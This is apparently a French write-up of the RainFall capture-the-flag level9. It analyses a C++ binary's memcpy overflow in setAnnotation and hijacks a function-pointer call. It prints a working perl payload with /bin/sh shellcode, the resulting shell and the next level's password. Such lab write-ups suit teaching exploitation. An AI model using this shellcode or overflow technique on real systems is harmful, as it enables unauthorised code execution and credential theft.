# level9

On a un programme en c++ cette fois.

Le programme prend un argument en paramètre.

On a une classe N, et une fonction membre `setAnnotation` qui appelle la fonction `memcpy`.

À la fin du main désassemblé, on observe un appel à la fonction `setAnnotation`.
```as
   0x08048677 <+131>:    call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:    mov    0x10(%esp),%eax
   0x08048680 <+140>:    mov    (%eax),%eax
   0x08048682 <+142>:    mov    (%eax),%edx
   0x08048684 <+144>:    mov    0x14(%esp),%eax
   0x08048688 <+148>:    mov    %eax,0x4(%esp)
   0x0804868c <+152>:    mov    0x10(%esp),%eax
   0x08048690 <+156>:    mov    %eax,(%esp)
   0x08048693 <+159>:    call   *%edx
   0x08048695 <+161>:    mov    -0x4(%ebp),%ebx
   0x08048698 <+164>:    leave  
   0x08048699 <+165>:    ret    
```
On peut overflow la fonction `memcpy` qui copie notre argument sur v6 + 4, et dont l'eip est à `0x804a00c`.

En regardant le passage qui suit l'appel de fonction, on peut observer qu'on prépare le retour de la fonction main : v6 en argument de v4 utilisée comme un pointeur sur fonction.

En regardant l'adresse de $eax à main+136 on retrouve l'adresse `0x804a00c`. Cette adresse est ensuite déréférencée, ce qui l'amène à `0x804a010` (`0x804a00c + 4`), puis chargée sur $edx pour ensuite être appelée en main+159.

On pense donc à charger un payload à cette adresse à la place de l'instruction attendue :
```bash
echo $(perl -e 'print "\x10\xa0\x04\x08"."\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"."A"x83 . "\x0c\xa0\x04\x08";') > /tmp/payload
```

Ce qui nous donne le flag espéré :
```bash
level9@RainFall:~$ echo $(perl -e 'print "\x10\xa0\x04\x08"."\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"."A"x83 . "\x0c\xa0\x04\x08";') > /tmp/payload
level9@RainFall:~$ ./level9 $(cat /tmp/payload)
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```
